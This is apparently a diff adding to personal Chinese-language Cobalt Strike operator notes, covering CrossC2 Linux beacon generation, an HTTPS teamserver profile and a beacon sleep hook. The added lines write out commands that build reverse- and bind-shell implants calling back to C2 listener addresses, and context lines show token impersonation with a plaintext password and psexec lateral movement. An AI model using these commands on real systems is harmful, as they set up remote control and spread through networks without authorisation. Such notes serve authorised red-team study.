@@ -114,6 +114,19 @@ HTTP Proxy: http://192.168.111.131:822
 右击某 session - Pivoting - Listener 填好内网地址等信息, name:pivot
 菜单Attack - Executable(S), 生成stateless 的 exe, listener: pivot
 ```
+#### 上线Linux
+CrossC2 - 上线linux插件
+
+```shell
+# reverse shell
+## 有 profile
+./genCrossC2.Linux 192.168.50.161 4431 .cobaltstrike.beacon_keys lib_rebind_test.so Linux x64 test
+## 无 profile
+./genCrossC2.Linux 192.168.93.1 443 .cobaltstrike.beacon_keys null Linux x64 ./test
+./genCrossC2.Linux 192.168.93.1 443 .cobaltstrike.beacon_keys null:config.ini Linux x64 t_cc2.out
+# bind shell
+./genCrossC2.Linux 192.168.50.161 4431 ./.cobaltstrike.beacon_keys null Linux-bind x64 t3.out
+```
 
 ### 代理服务器
 
@@ -138,6 +151,34 @@ beacon > rev2self # 恢复原始令牌
 
 beacon > make_token teamssix\administrator Test123!
 beacon > jump psexec_psh 192.168.175.200 smb
+```
+## Plugins
+
+### CrossC2/上线Linux
+
+__使用profile__
+
+protocol_demo有 `c2profile.c https.profile`
+
+1. 使用 https.profile 启动 teamserver
+1. 新建 `HTTPS` Listener, 只支持HTTPS
+1. 编译 c2profile.c
+1. 生成 bin 运行
+
+```shell
+teamserver.bat 192.168.50.161 xxxxxxx https.profile
+gcc c2profile.c -fPIC -shared -o lib_rebind_test.so
+./genCrossC2.Linux 192.168.50.161 4431 .cobaltstrike.beacon_keys lib_rebind_test.so Linux x64 test
+./test
+```
+
+修改心跳 CrossC2Kit_Loader.cna 末尾添加
+```shell
+# sleep 60
+on ssh_initial {
+    # show_message("1有新的LIUNX主机上线\nIP为".beacon_info($1,"internal")."\n主机名字为：".beacon_info($1,"computer"));
+    bsleep($1, 60);
+}
 ```
 
 # Learning
@@ -288,5 +329,4 @@ sub dialog_test {
 
 ## Vocabulary
 
-C2: command and control
-
+C2：Cobalt Strike
